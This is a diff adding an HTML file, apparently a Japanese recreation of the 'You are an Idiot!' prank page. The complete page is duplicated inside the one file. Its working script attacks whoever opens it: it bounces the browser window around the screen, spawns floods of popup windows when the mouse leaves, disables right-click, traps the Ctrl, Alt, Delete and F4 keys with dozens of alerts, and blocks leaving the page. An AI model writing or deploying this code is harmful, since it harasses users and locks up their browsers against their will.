@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <title>You are an Idiot!</title>
+    <style>
+        body { margin: 0; overflow: hidden; }
+        .info-container { 
+            display: inline-flex; 
+            padding: 10px; 
+            align-items: center; 
+            position: relative; 
+            z-index: 10;
+            color: white;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.8);
+        }
+        .info-container div { margin-left: 10px; }
+        .idiot-container { 
+            position: fixed; 
+            top: 0; bottom: 0; 
+            width: 100%; height: 100%; 
+        }
+        .idiot-container video { 
+            width: 100%; 
+            height: 100%; 
+            object-fit: cover;
+            position: fixed; 
+            top: 50%; 
+            left: 50%; 
+            transform: translate(-50%, -50%); 
+        }
+        .speaker { 
+            cursor: pointer; 
+            width: 60px; 
+            height: 60px; 
+        }
+    </style>
+</head>
+<body>
+
+<div class="idiot-container">
+    <video src="https://raw.githubusercontent.com/TheGeekBoiz/TheGeekBoiz.github.io/main/PythonScratcher/youareanidiot/media/youare.mp4" 
+           muted autoplay loop playsinline></video>
+</div>
+
+<div class="info-container">
+    <img id="youare-micon" class="speaker" 
+         src="https://raw.githubusercontent.com/TheGeekBoiz/TheGeekBoiz.github.io/main/PythonScratcher/youareanidiot/media/images/speakerm.png" 
+         onclick="musicPlay()">
+    
+    <div>
+        <h1>YOU ARE AN IDIOT!</h1>
+        <p>Click anywhere or speaker to start music</p>
+    </div>
+</div>
+
+<audio id="youare-audio" loop>
+    <source src="https://raw.githubusercontent.com/TheGeekBoiz/TheGeekBoiz.github.io/main/PythonScratcher/youareanidiot/media/youare.mp3" type="audio/mpeg">
+</audio>
+
+<script>
+// ---------- JavaScript ----------
+let audio = document.getElementById('youare-audio');
+let micon = document.getElementById('youare-micon');
+
+function musicPlay() {
+    if (audio.paused) {
+        audio.play();
+        micon.src = "https://raw.githubusercontent.com/TheGeekBoiz/TheGeekBoiz.github.io/main/PythonScratcher/youareanidiot/media/images/speaker.png";
+    } else {
+        audio.pause();
+        micon.src = "https://raw.githubusercontent.com/TheGeekBoiz/TheGeekBoiz.github.io/main/PythonScratcher/youareanidiot/media/images/speakerm.png";
+    }
+}
+
+document.addEventListener('click', musicPlay);
+
+var xOff = 5, yOff = 5, xPos = 400, yPos = -100, flagRun = 1;
+
+function openWindow() {
+    window.open('https://kubobeem.github.io/wow.com/lol.html', 
+                "_blank", 
+                'menubar=no,status=no,toolbar=no,resizable=no,width=357,height=330,titlebar=no,alwaysRaised=yes');
+}
+
+function proCreate() {	
+    for (var i = 0; i < 5; i++) openWindow();
+}
+
+function newXlt() { xOff = Math.ceil(-6 * Math.random()) * 5 - 10; window.focus(); }
+function newXrt() { xOff = Math.ceil(7 * Math.random())  * 5 - 10; window.focus(); }
+function newYup() { yOff = Math.ceil(-6 * Math.random()) * 5 - 10; window.focus(); }
+function newYdn() { yOff = Math.ceil(7 * Math.random()) * 5 - 10; window.focus(); }
+
+function playBall() {
+    xPos += xOff; yPos += yOff;
+    if (xPos > screen.width - 357) newXlt();
+    if (xPos < 0) newXrt();
+    if (yPos > screen.height - 330) newYup();
+    if (yPos < 0) newYdn();
+    
+    if (flagRun == 1) {
+        window.moveTo(xPos, yPos);
+        setTimeout(playBall, 1);
+    }
+}
+
+window.onload = function () {
+    flagRun = 1;
+    playBall();
+};
+
+window.onmouseout = proCreate;
+
+window.oncontextmenu = () => false;
+
+window.onkeydown = function(e) {
+    if ([17,18,46,115].includes(e.keyCode)) {
+        for(let i=0; i<20; i++) alert("UwU");
+        alert("You dumb?????!");
+        proCreate();
+    }
+};
+
+window.onbeforeunload = () => "UwU";
+// ---------- ここまで ----------
+</script>
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <title>You are an Idiot!</title>
+    <style>
+        body { margin: 0; overflow: hidden; }
+        .info-container { 
+            display: inline-flex; 
+            padding: 10px; 
+            align-items: center; 
+            position: relative; 
+            z-index: 10;
+            color: white;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.8);
+        }
+        .info-container div { margin-left: 10px; }
+        .idiot-container { 
+            position: fixed; 
+            top: 0; bottom: 0; 
+            width: 100%; height: 100%; 
+        }
+        .idiot-container video { 
+            width: 100%; 
+            height: 100%; 
+            object-fit: cover;
+            position: fixed; 
+            top: 50%; 
+            left: 50%; 
+            transform: translate(-50%, -50%); 
+        }
+        .speaker { 
+            cursor: pointer; 
+            width: 60px; 
+            height: 60px; 
+        }
+    </style>
+</head>
+<body>
+
+<div class="idiot-container">
+    <video src="https://raw.githubusercontent.com/TheGeekBoiz/TheGeekBoiz.github.io/main/PythonScratcher/youareanidiot/media/youare.mp4" 
+           muted autoplay loop playsinline></video>
+</div>
+
+<div class="info-container">
+    <img id="youare-micon" class="speaker" 
+         src="https://raw.githubusercontent.com/TheGeekBoiz/TheGeekBoiz.github.io/main/PythonScratcher/youareanidiot/media/images/speakerm.png" 
+         onclick="musicPlay()">
+    
+    <div>
+        <h1>YOU ARE AN IDIOT!</h1>
+        <p>Click anywhere or speaker to start music</p>
+    </div>
+</div>
+
+<audio id="youare-audio" loop>
+    <source src="https://raw.githubusercontent.com/TheGeekBoiz/TheGeekBoiz.github.io/main/PythonScratcher/youareanidiot/media/youare.mp3" type="audio/mpeg">
+</audio>
+
+<script>
+// ---------- JavaScript ----------
+let audio = document.getElementById('youare-audio');
+let micon = document.getElementById('youare-micon');
+
+function musicPlay() {
+    if (audio.paused) {
+        audio.play();
+        micon.src = "https://raw.githubusercontent.com/TheGeekBoiz/TheGeekBoiz.github.io/main/PythonScratcher/youareanidiot/media/images/speaker.png";
+    } else {
+        audio.pause();
+        micon.src = "https://raw.githubusercontent.com/TheGeekBoiz/TheGeekBoiz.github.io/main/PythonScratcher/youareanidiot/media/images/speakerm.png";
+    }
+}
+
+document.addEventListener('click', musicPlay);
+
+var xOff = 5, yOff = 5, xPos = 400, yPos = -100, flagRun = 1;
+
+function openWindow() {
+    window.open('https://kubobeem.github.io/wow.com/lol.html', 
+                "_blank", 
+                'menubar=no,status=no,toolbar=no,resizable=no,width=357,height=330,titlebar=no,alwaysRaised=yes');
+}
+
+function proCreate() {	
+    for (var i = 0; i < 5; i++) openWindow();
+}
+
+function newXlt() { xOff = Math.ceil(-6 * Math.random()) * 5 - 10; window.focus(); }
+function newXrt() { xOff = Math.ceil(7 * Math.random())  * 5 - 10; window.focus(); }
+function newYup() { yOff = Math.ceil(-6 * Math.random()) * 5 - 10; window.focus(); }
+function newYdn() { yOff = Math.ceil(7 * Math.random()) * 5 - 10; window.focus(); }
+
+function playBall() {
+    xPos += xOff; yPos += yOff;
+    if (xPos > screen.width - 357) newXlt();
+    if (xPos < 0) newXrt();
+    if (yPos > screen.height - 330) newYup();
+    if (yPos < 0) newYdn();
+    
+    if (flagRun == 1) {
+        window.moveTo(xPos, yPos);
+        setTimeout(playBall, 1);
+    }
+}
+
+window.onload = function () {
+    flagRun = 1;
+    playBall();
+};
+
+window.onmouseout = proCreate;
+
+window.oncontextmenu = () => false;
+
+window.onkeydown = function(e) {
+    if ([17,18,46,115].includes(e.keyCode)) {
+        for(let i=0; i<20; i++) alert("UwU");
+        alert("You dumb?????!");
+        proCreate();
+    }
+};
+
+window.onbeforeunload = () => "UwU";
+// ---------- ここまで ----------
+</script>
+</body>
+</html>
